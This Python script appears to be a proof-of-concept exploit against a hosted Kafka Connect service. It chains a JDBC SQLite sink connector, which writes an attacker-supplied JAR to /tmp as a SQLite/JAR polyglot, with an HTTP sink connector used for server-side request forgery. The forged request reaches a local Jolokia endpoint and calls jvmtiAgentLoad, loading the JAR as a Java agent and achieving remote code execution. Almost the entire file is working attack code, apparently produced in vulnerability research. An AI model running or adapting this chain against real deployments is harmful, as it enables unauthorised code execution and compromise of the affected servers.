import imp
import requests
import json
import random
import string
import base64
import kafka
import time
from kafka.admin import KafkaAdminClient, NewTopic

# kafka_connect_api_baseurl = "http://localhost:8083"
kafka_connect_api_baseurl = "https://kafkaconnect-307d41f5-topyte-d458.aivencloud.com"

kafka_user = "avnadmin"
kafka_password = ""

# kafka_bootstrap_server = "localhost:9092"
kafka_bootstrap_server = "kafka-1ee9357b-topyte-d458.aivencloud.com:27393"

hostname_payload = ""

random_str = ''.join(random.choice(string.ascii_lowercase) for _ in range(2))

def create_topic(topic_name):
    admin_client = KafkaAdminClient(
        bootstrap_servers=kafka_bootstrap_server,
        security_protocol="SSL",
        ssl_cafile="aiven-kafka-certs/ca.pem",
        ssl_certfile="aiven-kafka-certs/service.cert",
        ssl_keyfile="aiven-kafka-certs/service.key"
    )

    topic_list = []
    topic_list.append(NewTopic(name=topic_name, num_partitions=1, replication_factor=1))
    admin_client.create_topics(new_topics=topic_list, validate_only=False)


def upload_polyglot(destination, localpath):
    connector_name = f"jdbc_sqlite_poc_{random_str}"
    topic_name = f"jdbc-sqlite-{random_str}"

    create_topic(topic_name)

    connector_url = f"{kafka_connect_api_baseurl}/connectors/{connector_name}"

    payload = json.dumps({
        # "connector.class":"io.confluent.connect.jdbc.JdbcSinkConnector",
        "connector.class": "io.aiven.connect.jdbc.JdbcSinkConnector",
        "connection.url": f"jdbc:sqlite:{destination}",
        "connection.user": "something",
        "connection.password": "something",
        "name":connector_name,
        "topics": topic_name,
        "key.converter": "org.apache.kafka.connect.storage.StringConverter",
        "value.converter": "org.apache.kafka.connect.json.JsonConverter",
        "value.converter.schemas.enable": "true",
        "auto.create": "true" # Create tables automatically
    })
    headers = {
        'Content-Type': 'application/json'
    }

    response = requests.request("PUT", f"{connector_url}/config", headers=headers, data=payload, auth=(kafka_user, kafka_password))
    print(response.text)
    
    payload_data = None
    with open(localpath, 'rb') as f:
        payload_data = f.read()

    # Create SQLite - JAR polyglot by submitting the JAR data to the kafka topic.
    # The JDBC Sink Connector adds this data to the sqlite DB
    producer = kafka.KafkaProducer(
        bootstrap_servers=kafka_bootstrap_server,
        security_protocol="SSL",
        ssl_cafile="aiven-kafka-certs/ca.pem",
        ssl_certfile="aiven-kafka-certs/service.cert",
        ssl_keyfile="aiven-kafka-certs/service.key"
    )
    producer.send(topic_name, json.dumps(
        {
        "schema": {
            "type": "struct",
            "fields": [{
                "field": "payload",
                "type": "bytes",
                "optional": False
            }]
        },
        "payload": {
            "payload": base64.b64encode(payload_data).decode('utf-8') # JsonConverter uses com.fasterxml.jackson, which supports binary values as base64 encoded string
        }
        }
    ).encode('utf-8'))
    producer.flush()
    
    # Payload should now have been executed, delete the connector
    #response = requests.request("DELETE", connector_url, headers=headers, auth=(kafka_user, kafka_password))
    #print(response.text)



def send_http_post_ssrf(dst_url, body):
    connector_name = f"http_poc_{random_str}"
    topic_name = f"http-{random_str}"

    create_topic(topic_name)

    connector_url = f"{kafka_connect_api_baseurl}/connectors/{connector_name}"

    payload = json.dumps({
        "name": connector_name,
        "connector.class": "io.aiven.kafka.connect.http.HttpSinkConnector",
        "key.converter": "org.apache.kafka.connect.storage.StringConverter",
        "value.converter": "org.apache.kafka.connect.storage.StringConverter",
        "errors.log.enable": "true",
        "errors.log.include.messages": "true",
        "topics": topic_name,
        "http.url": dst_url,
        "http.headers.content.type": "application/json",
        "http.authorization.type": "none"
    })
    headers = {
        'Content-Type': 'application/json'
    }

    response = requests.request("PUT", f"{connector_url}/config", headers=headers, data=payload, auth=(kafka_user, kafka_password))
    print(response.text)

    producer = kafka.KafkaProducer(
        bootstrap_servers=kafka_bootstrap_server,
        security_protocol="SSL",
        ssl_cafile="aiven-kafka-certs/ca.pem",
        ssl_certfile="aiven-kafka-certs/service.cert",
        ssl_keyfile="aiven-kafka-certs/service.key"
    )
    producer.send(topic_name, body)
    producer.flush()
    
    # Payload should now have been executed, delete the connector
    #response = requests.request("DELETE", connector_url, headers=headers, auth=(kafka_user, kafka_password))
    #print(response.text)

agent_jar_name_path = f'/tmp/agent_{random_str}.jar'

upload_polyglot(agent_jar_name_path, 'java-agent-1.0-SNAPSHOT.jar')

# Wait for jdbc sink to create the sqlite database
print("Waiting...")
time.sleep(5)

send_http_post_ssrf("http://localhost:6725/jolokia/", json.dumps({
  "type" : "exec",
  "mbean" : "com.sun.management:type=DiagnosticCommand",
  "operation" : "jvmtiAgentLoad",
  "arguments": [agent_jar_name_path]
}).encode('utf-8'))

